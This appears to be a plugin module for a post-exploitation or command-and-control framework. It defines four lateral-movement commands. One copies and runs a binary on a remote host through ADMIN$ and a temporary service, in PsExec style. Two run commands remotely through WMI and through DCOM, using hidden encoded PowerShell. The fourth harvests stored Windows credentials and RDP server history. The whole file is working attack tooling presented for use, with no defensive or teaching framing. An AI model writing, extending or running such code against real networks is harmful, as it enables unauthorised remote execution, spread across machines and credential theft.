PLUGIN = {"name": "lateral", "desc": "Lateral movement: PsExec, WMI exec, DCOM exec, RDP harvest", "deps": [], "size": 4.5}

STUB_CODE = r"""
def _cmd_psexec(m):
    if platform.system() != "Windows": return {"output": "[!] PsExec requires Windows"}
    t = m.get("target",""); c = m.get("cmd",""); u = m.get("user",""); p = m.get("pass","")
    if not t or not c: return {"output": "Usage: target=<host> cmd=<command> [user=<user> pass=<pass>]"}
    import subprocess, tempfile, os, base64
    r = []
    try:
        if u and p:
            unc_path = f"\\\\{t}\\ADMIN$"
            subprocess.run(["net", "use", unc_path, p, "/user:" + u], capture_output=True, timeout=10)
            r.append("auth")
        tmp = "%TEMP%\\whisper_psexec.exe"
        if m.get("upload"):
            with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as f:
                f.write(base64.b64decode(m["upload"]))
                local = f.name
            subprocess.run(["cmd.exe", "/c", "copy", local, f"\\\\{t}\\ADMIN${tmp}"], capture_output=True, timeout=15)
            os.remove(local)
            r.append("copied")
        remote_svc = f"\\\\{t}"
        subprocess.run(["sc", remote_svc, "create", "Whisper_PSEXEC", f"binPath={tmp}", "start=demand"], capture_output=True, timeout=10)
        subprocess.run(["sc", remote_svc, "start", "Whisper_PSEXEC"], capture_output=True, timeout=15)
        subprocess.run(["sc", remote_svc, "delete", "Whisper_PSEXEC"], capture_output=True, timeout=10)
        subprocess.run(["wmic", f"/node:{t}", "process", "call", "create", f"cmd /c {c} > %TEMP%\\whisper_out.txt 2>&1"], capture_output=True, timeout=30, text=True)
        r.append("done")
    except Exception as e: r.append(f"error: {e}")
    return {"output": f"[+] PsExec: {', '.join(r)}"}

def _cmd_wmiexec(m):
    if platform.system() != "Windows": return {"output": "[!] WMI exec requires Windows"}
    t = m.get("target",""); c = m.get("cmd",""); u = m.get("user",""); p = m.get("pass","")
    if not t or not c: return {"output": "Usage: target=<host> cmd=<command> [user=<user> pass=<pass>]"}
    import subprocess
    try:
        a = ["wmic", "/node:" + t]
        if u and p: a += ["/user:" + u, "/password:" + p]
        a += ["process", "call", "create", f"cmd /c {c}"]
        r = subprocess.run(a, capture_output=True, text=True, timeout=30)
        out = r.stdout + r.stderr
        return {"output": f"[+] WMI exec result:\n{out[:2000]}"}
    except Exception as e: return {"output": f"[!] WMI exec failed: {e}"}

def _cmd_dcomexec(m):
    if platform.system() != "Windows": return {"output": "[!] DCOM exec requires Windows"}
    t = m.get("target",""); c = m.get("cmd",""); u = m.get("user",""); p = m.get("pass","")
    if not t or not c: return {"output": "Usage: target=<host> cmd=<command> [user=<user> pass=<pass>]"}
    import subprocess
    try:
        ps_cmd = f'''$c = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","{t}")); $c.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c {c}","7")'''
        args = ["powershell", "-NoP", "-NonI", "-W", "Hidden", "-Enc"]
        args.append(base64.b64encode(ps_cmd.encode("utf-16-le")).decode())
        if u and p:
            sec = f'-Credential (New-Object System.Management.Automation.PSCredential("{u}",(ConvertTo-SecureString "{p}" -AsPlainText -Force)))'
            args.insert(1, sec)
        r = subprocess.run(args, capture_output=True, text=True, timeout=30)
        return {"output": f"[+] DCOM exec sent: {r.stdout[:500]}"}
    except Exception as e: return {"output": f"[!] DCOM exec failed: {e}"}

def _cmd_rdp_harvest(m):
    if platform.system() != "Windows": return {"output": "[!] RDP harvest requires Windows"}
    import subprocess, os
    r = []
    try:
        out = subprocess.run(["qwinsta"], capture_output=True, text=True, timeout=10)
        r.append(f"Sessions:\n{out.stdout[:1000]}")
    except: pass
    for p in [os.path.expanduser("~/AppData/Local/Microsoft/Credentials"),
              os.path.expanduser("~/AppData/Roaming/Microsoft/Credentials")]:
        if os.path.isdir(p):
            r.append(f"Cred files: {len(os.listdir(p))} in {p}")
            for f in os.listdir(p)[:5]:
                r.append(f"  {f}")
    try:
        out = subprocess.run(["cmdkey", "/list"], capture_output=True, text=True, timeout=10)
        r.append(f"Stored creds:\n{out.stdout[:1000]}")
    except: pass
    try:
        out = subprocess.run(["reg", "query", "HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers"],
                            capture_output=True, text=True, timeout=10)
        r.append(f"RDP servers:\n{out.stdout[:500]}")
    except: pass
    return {"output": "\n".join(r)}
_CMDS["psexec"] = _cmd_psexec; _CMDS["wmiexec"] = _cmd_wmiexec; _CMDS["dcomexec"] = _cmd_dcomexec; _CMDS["rdp_harvest"] = _cmd_rdp_harvest
"""

def get_commands():
    return {"psexec": "_cmd_psexec", "wmiexec": "_cmd_wmiexec", "dcomexec": "_cmd_dcomexec", "rdp_harvest": "_cmd_rdp_harvest"}
